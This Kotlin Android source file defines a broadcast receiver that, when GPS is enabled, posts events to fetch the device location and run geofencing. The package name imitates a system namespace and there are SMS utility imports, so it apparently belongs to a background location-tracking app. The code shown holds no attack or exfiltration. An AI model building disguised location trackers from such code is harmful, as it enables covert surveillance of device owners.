package com.android.services.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.util.EventLog
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.DeviceInformationUtil.isGpsEnabled
import com.android.services.util.SmsUtil
import org.greenrobot.eventbus.EventBus
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class GpsLocationReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (Objects.requireNonNull(intent.action).equals("android.location.PROVIDERS_CHANGED")) {
            if (isGpsEnabled(context)) {
                if (AppConstants.gpsIntervalCounter == 5) {
                    EventBus.getDefault().post("fetchGpsLocation")
                }
                EventBus.getDefault().post("geoFencing")
            }
        }
    }
}